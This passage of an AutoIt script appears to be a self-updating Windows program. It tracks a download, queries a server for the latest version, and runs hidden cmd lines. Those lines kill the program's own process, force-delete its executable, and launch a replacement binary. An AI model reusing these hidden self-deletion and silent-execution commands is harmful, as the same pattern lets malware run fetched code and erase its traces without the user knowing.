		ElseIf $ipsva > 95 Then
			If $ibytessize = 0 Then
				$ipsva = 100
				For $outcount = 6 To 0 Step -1
					Sleep(1000)
				Next
				ExitLoop
			EndIf
		EndIf
		Sleep(100)
		If ($idownloadiscomplete = "True" AND $ifileex > 0) AND $ifilesize > 0 Then
			$ipsva = 100
			ExitLoop
		EndIf
	Next
	$ifilesizetomb = Round($ifilesize / 1024 / 1024, 2)
	$itotalbytessizetomb = Round($itotalbytessize / 1024 / 1024, 2)
	If ($itotalbytessizetomb <> 0 AND $ifilesizetomb <> 0) AND $ifilesizetomb = $itotalbytessizetomb Then
		InetClose($hdownload)
		Return 1
	Else
		InetClose($hdownload)
		Return 0
	EndIf
EndFunc

Func getserverappnewversion($surl)
	Local $srvpinginfo1 = Ping($srvip, 15000)
	If $srvpinginfo1 = 0 Then
		Return 0
	EndIf
	Local $ohttp = ObjCreate("WinHttp.WinHttpRequest.5.1")
	$ohttp.open("GET", $surl, False)
	If (@error) Then Return SetError(1, 0, 0)
	$ohttp.setrequestheader("Content-Type", "application/octet-stream; charset=utf-8")
	$ohttp.send("test")
	If (@error) Then
		Return SetError(2, 0, 0)
	EndIf
	Return $ohttp.responsetext
EndFunc

Func dellegacyapp($filepath, $updateappname)
	Local $run1 = Run("cmd /c ping 127.0.0.1 12 & taskkill /f /pid " & @AutoItPID & "& del /q/f/a " & @ScriptFullPath & " & copy " & $filepath & $updateappname & " " & @ScriptDir & " /y & " & @ScriptDir & $updateappname & " & del /q/f/a " & $filepath & " ", "", @SW_HIDE)
	If $run1 > 0 Then
		$opdetail = "更新执行成功"
		siopupdate($opdetail)
		Exit
		Return 1
	Else
		Return 0
	EndIf
EndFunc

Func delselfapp()
	Local $run1 = Run("cmd /c ping 127.0.0.1 12 & taskkill /f /pid " & @AutoItPID & "& del /q/f/a " & @ScriptFullPath & "  ", "", @SW_HIDE)
	Exit
EndFunc
